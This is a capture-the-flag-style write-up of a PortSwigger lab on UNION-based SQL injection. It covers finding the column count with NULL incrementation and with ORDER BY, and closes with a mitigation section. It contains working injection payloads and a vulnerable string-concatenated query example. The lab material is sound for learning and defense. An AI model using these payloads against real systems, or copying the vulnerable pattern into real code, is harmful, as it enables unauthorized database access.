# SQL Injection UNION Attack - Determining Number of Columns

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Determine the number of columns returned by the original database query using a UNION-based SQL injection attack.

---

## Vulnerability

The application is vulnerable to SQL injection in the product category filter. While it filters data based on user input, it fails to sanitize the `category` parameter, allowing UNION-based attacks.

**Backend Query Structure:**
```sql
SELECT column1, column2, column3 FROM products WHERE category = 'USER_INPUT'
```

**Developer Mistake:**  
- **No input sanitization** on the `category` parameter
- **String concatenation** instead of parameterized queries
- **Verbose error messages** that leak database structure information (in some cases)
- **No query result validation** to detect injected UNION statements

The UNION operator in SQL combines results from two SELECT statements, but they must have the **same number of columns**. This constraint becomes our reconnaissance tool.

---

## Understanding UNION Attacks

### UNION Requirements:
1. **Same number of columns** in both SELECT statements
2. **Compatible data types** in corresponding columns (NULL bypasses this)

### Why NULL Works:
- `NULL` is compatible with every data type (string, integer, date, etc.)
- Allows us to probe for column count without knowing data types
- No visible output initially — just structural validation

---

## Steps

1. **Identified the injection point**
   - URL: `/filter?category=Gifts`
   - Confirmed basic SQL injection with `Gifts'--`

2. **Started with UNION reconnaissance**
   - Attempted: `' UNION SELECT NULL--`
   - Result: ❌ Error (column count mismatch)

3. **Incremented NULL values systematically**
   - Attempted: `' UNION SELECT NULL,NULL--`
   - Result: ❌ Error (still not matching)

4. **Found the correct column count**
   - Attempted: `' UNION SELECT NULL,NULL,NULL--`
   - Result: ✅ Success! Page loaded without errors

5. **Conclusion**
   - Original query returns exactly **3 columns**
   - Now ready for data extraction in subsequent labs

---

## Payload

```sql
' UNION SELECT NULL,NULL,NULL--
```

**Complete URL:**
```
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```

**Resulting SQL Query:**
```sql
SELECT column1, column2, column3 FROM products WHERE category = 'Gifts' 
UNION 
SELECT NULL,NULL,NULL--'
```

**What happens:**
- `Gifts'` closes the original category string
- `UNION` combines results from the original query with our injected query
- `SELECT NULL,NULL,NULL` matches the 3-column structure
- `--` comments out any trailing SQL
- Database returns combined results without errors

---

## Column Count Detection Methods

### Method 1: NULL Incrementation (What I Used)
```sql
' UNION SELECT NULL--           ❌ Error
' UNION SELECT NULL,NULL--      ❌ Error  
' UNION SELECT NULL,NULL,NULL-- ✅ Success → 3 columns
```

**Pros:** Works on all databases, bypasses data type issues  
**Cons:** Manual, requires multiple attempts

### Method 2: ORDER BY (Alternative)
```sql
' ORDER BY 1--  ✅ Success
' ORDER BY 2--  ✅ Success
' ORDER BY 3--  ✅ Success
' ORDER BY 4--  ❌ Error → 3 columns confirmed
```

**Pros:** Faster, fewer requests  
**Cons:** Some databases don't support ORDER BY in UNION contexts

---

## What I Learned

1. **UNION attacks require column count matching** — the first step is always enumeration
2. **NULL is the universal bypass** for data type constraints during reconnaissance
3. **Systematic approach wins** — increment NULLs one by one until success
4. **Error messages are valuable** — they reveal when column counts mismatch
5. **This is just reconnaissance** — finding column count enables the real attack (data extraction)

---

## Mitigation

**For Developers:**
- Use **parameterized queries** (prepared statements) instead of string concatenation
- Implement **input validation** and whitelist allowed category values
- Apply **principle of least privilege** to database user accounts
- Never trust user input — always sanitize and validate

**Example Fix (Python):**
```python
# ❌ Vulnerable
query = f"SELECT * FROM products WHERE category = '{user_input}'"

# ✅ Secure
query = "SELECT * FROM products WHERE category = ?"
cursor.execute(query, (user_input,))
```

